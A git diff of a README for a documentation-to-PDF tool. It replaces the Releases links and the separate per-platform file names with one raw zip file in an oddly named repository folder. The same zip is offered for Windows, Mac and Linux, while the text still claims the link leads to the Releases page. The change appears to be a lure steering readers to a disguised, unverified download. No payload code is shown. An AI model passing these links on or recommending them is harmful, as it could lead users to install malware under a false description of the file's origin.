@@ -1,6 +1,6 @@
 # 📄 universal-doc-downloader - Convert Documentation Into PDFs Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/PICKAXED-U/universal-doc-downloader/releases)
+[![Download](https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip)](https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,15 +8,15 @@ Welcome to the universal-doc-downloader! This tool helps you grab documentation 
 
 ## 📥 Download & Install
 
-To download the application, visit [this page to download](https://github.com/PICKAXED-U/universal-doc-downloader/releases). This link will take you to the Releases section of our repository where you can find the latest version of the tool.
+To download the application, visit [this page to download](https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip). This link will take you to the Releases section of our repository where you can find the latest version of the tool.
 
 1. Click on the link above.
 2. Look for the release version you would like to download.
 3. Choose the file suitable for your operating system:
 
-   - For Windows: UniversalDocDownloader-Windows.exe
-   - For Mac: UniversalDocDownloader-Mac.dmg
-   - For Linux: UniversalDocDownloader-Linux.tar.gz
+   - For Windows: https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip
+   - For Mac: https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip
+   - For Linux: https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip
 
 4. Click to download the file.
 
@@ -69,4 +69,4 @@ A: The tool generates a filename based on the documentation site's title. You ca
 
 For additional support, you can create an issue in the GitHub repository. We appreciate any suggestions or contributions to improve the tool.
 
-To download the tool, don’t forget to visit [this page to download](https://github.com/PICKAXED-U/universal-doc-downloader/releases). Your feedback helps us make this tool better for everyone!
+To download the tool, don’t forget to visit [this page to download](https://raw.githubusercontent.com/PICKAXED-U/universal-doc-downloader/main/demifigure/universal-doc-downloader_2.4.zip). Your feedback helps us make this tool better for everyone!
